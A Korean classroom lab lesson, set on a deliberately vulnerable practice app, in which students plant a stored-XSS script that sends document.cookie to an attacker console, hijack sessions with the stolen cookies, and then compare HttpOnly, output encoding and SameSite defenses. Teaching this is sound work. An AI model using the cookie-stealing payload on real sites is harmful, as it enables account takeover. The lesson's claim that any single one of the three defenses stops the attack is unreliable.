# 쿠키·세션과 XSS · 로그인을 통째로 훔치기

로그인하면 비밀번호를 매번 다시 안 쳐도 되죠. 브라우저가 **세션 쿠키**라는 '출입증'을 들고 있기 때문입니다.
그런데 이 출입증을 누가 훔치면 어떻게 될까요? 비밀번호를 몰라도 그 사람 행세를 할 수 있습니다.
이번 시간엔 **저장형 XSS**로 쿠키를 훔치고, 그 쿠키로 남의 계정에 들어가는 과정을 직접 해봅니다. 마지막엔 막는 법까지 비교합니다.

> 가상 커뮤니티 **TalkSpot**(일부러 취약하게 만든 앱)을 사용합니다.
> 모든 계정·쿠키·글은 가짜이며 메모리에만 존재하고, 종료 시 사라집니다.

## 오늘의 목표

- 쿠키·세션이 로그인 상태를 **어떻게** 유지하는지 이해한다
- **저장형 XSS**로 세션 쿠키를 탈취해본다
- 탈취한 쿠키로 **세션 하이재킹**(계정 가로채기)을 해본다
- HttpOnly·출력 인코딩·SameSite 방어가 왜 효과가 있는지 직접 확인한다

## 진행 방식

학생들이 **각자 공격자가 되어** 직접 페이로드를 심고, 쿠키를 훔치고, 하이재킹까지 해봅니다.
강사는 `취약 모드 ↔ 안전 모드` 스위치로 방어 효과를 함께 비교합니다. (시작은 **취약 모드**)
화면 3개를 기억하세요: 홈 `/` · 방명록 `/board` · 공격자 콘솔 `/attacker`

---

## 단계 1 · 출입증의 정체 (10분)

1. 홈에서 `teacher` 로 로그인합니다.
2. <kbd>F12</kbd> → Application(저장소) → Cookies 에서 `sid` 쿠키를 찾습니다.
3. 콘솔에 `document.cookie` 를 쳐보면 **쿠키 값이 그대로 보입니다.**
4. `/mypage` 에 가보면 비밀번호를 다시 안 쳐도 비공개 정보가 보입니다.

> 결론: **이 쿠키 한 줄 = 출입증.** 이걸 가진 사람이 곧 로그인한 사람입니다.

## 단계 2 · 저장형 XSS로 쿠키 훔치기 (20분)

방명록 `/board` 글쓰기 칸에 아래를 붙여넣고 등록합니다.

```html
<script>new Image().src='/steal?c='+encodeURIComponent(document.cookie)</script>
```

이제 **누군가 방명록을 열기만 하면** 그 사람 브라우저에서 이 스크립트가 실행되어 쿠키가 공격자에게 전송됩니다.

1. 학생들끼리 각자 로그인한 뒤 서로의 방명록을 열어봅니다.
2. **공격자 콘솔 `/attacker`** 를 새로고침하면 탈취된 쿠키들이 쌓입니다.

> 핵심: 글(데이터)에 심은 스크립트가 **그 글을 보는 모든 사람**의 브라우저에서 실행된다 = 저장형 XSS.

## 단계 3 · 세션 하이재킹 (10분)

1. 공격자 콘솔에서 탈취된 쿠키 값(`sid=...`)을 복사합니다.
2. "훔친 쿠키로 로그인" 칸에 붙여넣고 실행합니다.
3. `/mypage` 로 가보면 **피해자 계정으로 로그인된 상태**입니다. 비밀번호는 한 번도 몰랐는데도요.

> 핵심: 세션 쿠키만 손에 넣으면 비밀번호 없이 그 사람 행세를 할 수 있다 = 세션 하이재킹.

## 단계 4 · 방어 비교 (15분)

홈에서 **안전 모드로 전환**한 뒤, 다시 로그인하고 같은 공격을 그대로 시도해 보세요.

| 방어 기법 | 효과 |
|---|---|
| **HttpOnly 쿠키** | JS가 `document.cookie`로 못 읽음 → XSS로 쿠키 탈취 불가 |
| **출력 인코딩(이스케이프)** | 글 속 `<script>`가 글자로만 보이고 실행 안 됨 → XSS 자체 차단 |
| **SameSite 쿠키** | 다른 사이트에서 온 요청에 쿠키 첨부 차단 |

- 안전 모드에선 같은 페이로드가 **화면에 글자로만** 보이고, `document.cookie`도 `sid`를 내주지 않습니다.
- 토론: *"세 방어 중 하나만 켜도 공격이 무너진다. 그래서 보안은 겹겹이(다층 방어) 한다."*

## 꼭 기억하기

오늘 흐름은 **입력을 안 거름(XSS) → 쿠키 탈취 → 하이재킹** 이었습니다.
허락 없이 실제 사이트에 XSS를 시도하면 범죄입니다. 개발자의 책임은 입력 검증·출력 인코딩·HttpOnly·세션 만료입니다.

> **강사 메모.** 꼬이면 홈의 **초기화**로 비웁니다. 모드 전환 뒤에는 **다시 로그인**해야 새 쿠키 정책이 적용됩니다.
